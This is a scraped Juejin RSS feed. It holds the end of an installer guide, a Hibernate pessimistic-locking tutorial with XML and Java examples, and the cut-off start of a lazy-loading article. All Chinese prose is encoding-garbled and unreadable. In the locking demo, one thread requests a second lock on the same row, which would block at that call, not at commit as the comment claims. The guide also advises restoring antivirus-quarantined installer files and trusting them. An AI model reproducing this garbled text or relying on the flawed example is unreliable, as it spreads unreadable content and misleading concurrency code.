<p>å®‰è£…ç»“æŸåï¼Œä¼šå¼¹å‡ºâ€œå®Œæˆâ€çª—å£ï¼Œå‹¾ä¸Šâ€œè¿è¡Œè½¯ä»¶â€ï¼ˆå¯é€‰ï¼‰ï¼Œç„¶åç‚¹â€œå…³é—­â€ã€‚</p>
<p>å»æ¡Œé¢æ‰¾å›¾æ ‡ï¼ˆå¦‚æœå‹¾äº†å¿«æ·æ–¹å¼ï¼‰ï¼ŒåŒå‡»æ‰“å¼€è¯•è¯•èƒ½ä¸èƒ½æ­£å¸¸å¯åŠ¨ã€‚è¦æ˜¯æ‰“ä¸å¼€ï¼Œå¯èƒ½æ˜¯è¢«æ€æ¯’è½¯ä»¶æ‹¦æˆªäº†â€”â€”å»æ€æ¯’è½¯ä»¶çš„â€œéš”ç¦»åŒºâ€çœ‹çœ‹ï¼ŒæŠŠnbsetupç›¸å…³çš„æ–‡ä»¶æ¢å¤å¹¶æ·»åŠ ä¿¡ä»»ã€‚</p>
<p>â€‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ17ï¼‰ä»€ä¹ˆæ˜¯Hibernateçš„æ‚²è§‚é”ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7589893746081153065</link>    <guid>https://juejin.cn/post/7589893746081153065</guid>    <pubDate>2026-01-02T01:30:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589893746081153065" data-draft-id="7589838742552903699" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ17ï¼‰ä»€ä¹ˆæ˜¯Hibernateçš„æ‚²è§‚é”ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-02T01:30:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ17ï¼‰ä»€ä¹ˆæ˜¯Hibernateçš„æ‚²è§‚é”ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T01:30:58.000Z" title="Fri Jan 02 2026 01:30:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Hibernateçš„æ‚²è§‚é”ï¼ˆPessimistic Lockingï¼‰æ˜¯ä¸€ç§å¹¶å‘æ§åˆ¶æœºåˆ¶ï¼Œç”¨äºé˜²æ­¢å¤šä¸ªäº‹åŠ¡åŒæ—¶è®¿é—®å’Œä¿®æ”¹ç›¸åŒçš„æ•°æ®è®°å½•ã€‚ä¸ä¹è§‚é”ä¸åŒï¼Œæ‚²è§‚é”åœ¨è¯»å–æ•°æ®æ—¶å³å¯¹æ•°æ®è¿›è¡Œé”å®šï¼Œä»¥ç¡®ä¿åç»­çš„äº‹åŠ¡åœ¨è®¿é—®å’Œä¿®æ”¹æ•°æ®æ—¶å¿…é¡»ç­‰å¾…è¯¥é”é‡Šæ”¾ï¼Œä»è€Œé¿å…æ•°æ®å†²çªã€‚</p>
<h3 data-id="heading-0">æ‚²è§‚é”çš„å®ç°</h3>
<p>æ‚²è§‚é”é€šå¸¸é€šè¿‡æ•°æ®åº“çš„é”æœºåˆ¶å®ç°ï¼Œä¾‹å¦‚è¡Œçº§é”ã€è¡¨çº§é”ç­‰ã€‚Hibernateæä¾›äº†å‡ ç§æ–¹å¼æ¥å®ç°æ‚²è§‚é”ï¼Œä¸»è¦ä½¿ç”¨<code>LockMode</code>æšä¸¾ç±»å’Œ<code>Session</code>ä¸­çš„é”å®šæ–¹æ³•ã€‚</p>
<h3 data-id="heading-1">ç¤ºä¾‹ä»£ç </h3>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªå®Œæ•´çš„ç¤ºä¾‹ï¼Œå±•ç¤ºå¦‚ä½•åœ¨Hibernateä¸­ä½¿ç”¨æ‚²è§‚é”ã€‚</p>
<h4 data-id="heading-2">é…ç½®æ–‡ä»¶ <code>hibernate.cfg.xml</code></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- æ•°æ®åº“è¿æ¥é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate å±æ€§é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- æ˜ å°„ç±»é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Student"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-3">HibernateUtil ç±»</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä»é…ç½®æ–‡ä»¶åˆ›å»ºSessionFactory</span>
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            <span class="hljs-comment">// è®°å½•å¯åŠ¨å¤±è´¥çš„é”™è¯¯</span>
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<h4 data-id="heading-4">å®ä½“ç±» Student</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.Entity;
<span class="hljs-keyword">import</span> javax.persistence.GeneratedValue;
<span class="hljs-keyword">import</span> javax.persistence.GenerationType;
<span class="hljs-keyword">import</span> javax.persistence.Id;

<span class="hljs-meta">@Entity</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-comment">// getters å’Œ setters</span>
    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> age;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.age = age;
    }
}
</code></pre>
<h3 data-id="heading-5">æ‚²è§‚é”ç¤ºä¾‹ä»£ç </h3>
<p>ä¸‹é¢çš„ç¤ºä¾‹å±•ç¤ºäº†å¦‚ä½•åœ¨å¹¶å‘ç¯å¢ƒä¸­ä½¿ç”¨æ‚²è§‚é”ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.LockMode;
<span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernatePessimisticLockingExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// è·å–SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();
        
        <span class="hljs-comment">// ç¬¬ä¸€ä¸ªä¼šè¯</span>
        <span class="hljs-type">Session</span> <span class="hljs-variable">session1</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction1</span> <span class="hljs-operator">=</span> session1.beginTransaction();
        
        <span class="hljs-comment">// ç¬¬äºŒä¸ªä¼šè¯</span>
        <span class="hljs-type">Session</span> <span class="hljs-variable">session2</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction2</span> <span class="hljs-operator">=</span> session2.beginTransaction();

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// åœ¨ç¬¬ä¸€ä¸ªä¼šè¯ä¸­è·å–å¯¹è±¡å¹¶åŠ é”</span>
            <span class="hljs-type">Student</span> <span class="hljs-variable">student1</span> <span class="hljs-operator">=</span> session1.get(Student.class, <span class="hljs-number">1L</span>, LockMode.PESSIMISTIC_WRITE);
            System.out.println(<span class="hljs-string">"Session1 - Student: "</span> + student1.getName() + <span class="hljs-string">", Age: "</span> + student1.getAge());

            <span class="hljs-comment">// åœ¨ç¬¬äºŒä¸ªä¼šè¯ä¸­å°è¯•è·å–ç›¸åŒçš„å¯¹è±¡å¹¶åŠ é”</span>
            <span class="hljs-type">Student</span> <span class="hljs-variable">student2</span> <span class="hljs-operator">=</span> session2.get(Student.class, <span class="hljs-number">1L</span>, LockMode.PESSIMISTIC_WRITE);
            System.out.println(<span class="hljs-string">"Session2 - Student: "</span> + student2.getName() + <span class="hljs-string">", Age: "</span> + student2.getAge());

            <span class="hljs-comment">// ä¿®æ”¹å¹¶æ›´æ–°å¯¹è±¡</span>
            student1.setAge(<span class="hljs-number">21</span>);
            session1.update(student1);
            transaction1.commit();
            System.out.println(<span class="hljs-string">"Session1 - Updated Student: "</span> + student1.getName() + <span class="hljs-string">", Age: "</span> + student1.getAge());

            <span class="hljs-comment">// å°è¯•åœ¨ç¬¬äºŒä¸ªä¼šè¯ä¸­æäº¤ä¿®æ”¹</span>
            student2.setAge(<span class="hljs-number">22</span>);
            session2.update(student2);
            transaction2.commit(); <span class="hljs-comment">// è¿™é‡Œä¼šç­‰å¾…ç›´åˆ°ç¬¬ä¸€ä¸ªäº‹åŠ¡æäº¤æˆ–å›æ»š</span>

        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction2 != <span class="hljs-literal">null</span>) {
                transaction2.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session1 != <span class="hljs-literal">null</span>) {
                session1.close();
            }
            <span class="hljs-keyword">if</span> (session2 != <span class="hljs-literal">null</span>) {
                session2.close();
            }
        }

        <span class="hljs-comment">// å…³é—­SessionFactory</span>
        sessionFactory.close();
    }
}
</code></pre>
<h3 data-id="heading-6">è¯¦ç»†è§£é‡Š</h3>
<ol>
<li>
<p><strong>é…ç½®æ‚²è§‚é”</strong>ï¼šåœ¨è·å–å®ä½“å¯¹è±¡æ—¶ä½¿ç”¨<code>LockMode</code>æ¥æŒ‡å®šé”å®šæ¨¡å¼ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Student</span> <span class="hljs-variable">student1</span> <span class="hljs-operator">=</span> session1.get(Student.class, <span class="hljs-number">1L</span>, LockMode.PESSIMISTIC_WRITE);
</code></pre>
</li>
<li>
<p><strong>ç¤ºä¾‹åœºæ™¯</strong>ï¼š</p>
<ul>
<li>åœ¨ç¬¬ä¸€ä¸ªä¼šè¯ä¸­è·å–åŒä¸€ä¸ªStudentå¯¹è±¡ï¼Œå¹¶ä½¿ç”¨æ‚²è§‚é”è¿›è¡Œé”å®šã€‚</li>
<li>åœ¨ç¬¬äºŒä¸ªä¼šè¯ä¸­å°è¯•è·å–åŒä¸€ä¸ªStudentå¯¹è±¡ï¼Œå¹¶åŒæ ·ä½¿ç”¨æ‚²è§‚é”è¿›è¡Œé”å®šã€‚</li>
<li>ç¬¬äºŒä¸ªä¼šè¯åœ¨è·å–å¯¹è±¡æ—¶ä¼šè¢«é˜»å¡ï¼Œç›´åˆ°ç¬¬ä¸€ä¸ªä¼šè¯æäº¤æˆ–å›æ»šäº‹åŠ¡ã€‚</li>
<li>ç¬¬ä¸€ä¸ªä¼šè¯ä¿®æ”¹å¹¶æ›´æ–°å¯¹è±¡ï¼Œæäº¤äº‹åŠ¡ã€‚</li>
<li>ç¬¬äºŒä¸ªä¼šè¯åœ¨ç¬¬ä¸€ä¸ªä¼šè¯æäº¤åè·å–é”ï¼Œè¿›è¡Œä¿®æ”¹å¹¶æäº¤äº‹åŠ¡ã€‚</li>
</ul>
</li>
<li>
<p><strong>äº‹åŠ¡ç®¡ç†</strong>ï¼šåœ¨äº‹åŠ¡ä¸­è¿›è¡Œæ•°æ®æ“ä½œï¼Œå¹¶åœ¨æ“ä½œå®Œæˆåæäº¤äº‹åŠ¡ã€‚å¦‚æœæ“ä½œå¤±è´¥ï¼Œåˆ™å›æ»šäº‹åŠ¡ä»¥ç¡®ä¿æ•°æ®ä¸€è‡´æ€§ã€‚</p>
</li>
</ol>
<h3 data-id="heading-7">æ€»ç»“</h3>
<p>æ‚²è§‚é”æ˜¯ä¸€ç§æœ‰æ•ˆçš„å¹¶å‘æ§åˆ¶æœºåˆ¶ï¼Œé€šè¿‡åœ¨è¯»å–æ•°æ®æ—¶å³è¿›è¡Œé”å®šï¼Œç¡®ä¿åœ¨äº‹åŠ¡æäº¤ä¹‹å‰å…¶ä»–äº‹åŠ¡æ— æ³•è®¿é—®å’Œä¿®æ”¹è¯¥æ•°æ®ã€‚åœ¨Hibernateä¸­ï¼Œé€šè¿‡<code>LockMode.PESSIMISTIC_WRITE</code>ç­‰é”å®šæ¨¡å¼å¯ä»¥æ–¹ä¾¿åœ°å®ç°æ‚²è§‚é”ã€‚ç†è§£å¹¶æ­£ç¡®åº”ç”¨æ‚²è§‚é”ï¼Œå¯ä»¥æœ‰æ•ˆåœ°é¿å…æ•°æ®å†²çªï¼Œç¡®ä¿æ•°æ®ä¸€è‡´æ€§å’Œæ­£ç¡®æ€§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ18ï¼‰Hibernateçš„å»¶è¿ŸåŠ è½½æ˜¯ä»€ä¹ˆï¼Ÿ]]></title>    <link>https://juejin.cn/post/7589839433321709631</link>    <guid>https://juejin.cn/post/7589839433321709631</guid>    <pubDate>2026-01-02T01:31:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589839433321709631" data-draft-id="7589916567876255786" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ18ï¼‰Hibernateçš„å»¶è¿ŸåŠ è½½æ˜¯ä»€ä¹ˆï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-02T01:31:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ18ï¼‰Hibernateçš„å»¶è¿ŸåŠ è½½æ˜¯ä»€ä¹ˆï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T01:31:58.000Z" title="Fri Jan 02 2026 01:31:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 